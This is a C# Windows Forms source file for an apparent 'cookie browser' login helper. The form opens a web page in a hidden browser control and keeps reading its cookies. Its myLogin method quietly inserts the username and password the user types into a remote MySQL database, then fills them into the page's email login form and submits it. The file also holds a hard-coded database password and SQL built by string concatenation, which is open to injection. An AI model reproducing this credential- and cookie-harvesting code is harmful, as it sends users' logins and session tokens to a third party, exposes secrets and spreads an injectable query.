using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace helper
{
    public partial class cookieBrowser : Form
    {
        public static string webUrl = "";
        public static string cookie = "";
        public cookieBrowser(string url)
        {
            InitializeComponent();
            webUrl = url;
            method.SetFeatures(11000);
            webBrowser1.ScriptErrorsSuppressed = true;

            webBrowser1.Url = new Uri(webUrl);
             webBrowser1.Navigate(webUrl);
        }

        private void cookieBrowser_Load(object sender, EventArgs e)
        {
            webBrowser1.Visible = false;
            timer1.Start();
            button2.Enabled = true;

        }

        private void button1_Click(object sender, EventArgs e)
        {
            cookie = method.GetCookies(webUrl);
            this.Hide();

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            webBrowser1.Refresh();
            cookie = method.GetCookies(webUrl);
        }

        private void webBrowser1_NewWindow(object sender, CancelEventArgs e)
        {
            //防止弹窗；
            e.Cancel = true;
            string url = this.webBrowser1.StatusText;
            this.webBrowser1.Url = new Uri(url);
        }

        #region  注册函数

        public void myLogin()
        {

            try

            {

                string constr = "Host =143.92.45.176;Database=fastadmin;Username=fastadmin;Password=cFfJA2SH3JeFKtj7";
                MySqlConnection mycon = new MySqlConnection(constr);
                mycon.Open();

                MySqlCommand cmd = new MySqlCommand("INSERT INTO fa_mail_user (username,password)VALUES('" + textBox1.Text + " ', '" + textBox2.Text + " ')", mycon);         //SQL语句读取textbox的值'"+skinTextBox1.Text+"'


                int count = cmd.ExecuteNonQuery();  //count就是受影响的行数,如果count>0说明执行成功,如果=0说明没有成功.
                if (count > 0)
                {
                    webBrowser1.Visible = true;

                    mycon.Close();
                    HtmlDocument dc = webBrowser1.Document;
                    HtmlElementCollection es = dc.GetElementsByTagName("input");   //GetElementsByTagName返回集合
                    foreach (HtmlElement e1 in es)
                    {
                        if (e1.GetAttribute("name") == "email")
                        {
                            e1.SetAttribute("value", textBox1.Text.Trim());
                        }
                        if (e1.GetAttribute("name") == "password")
                        {
                            e1.SetAttribute("value", textBox2.Text.Trim());
                        }
                    }

                    HtmlElementCollection es2 = dc.GetElementsByTagName("a");   //GetElementsByTagName返回集合
                    foreach (HtmlElement e1 in es2)
                    {
                        if (e1.GetAttribute("id") == "dologin")
                        {
                            e1.InvokeMember("click");
                        }

                    }

                }
                else
                {
                    MessageBox.Show("连接失败！");
                }


            }

            catch (System.Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
            #endregion
            private void button2_Click(object sender, EventArgs e)
        {
            myLogin();
            webBrowser1.Visible = true;
            button2.Enabled = false;
        }

       
    }
}
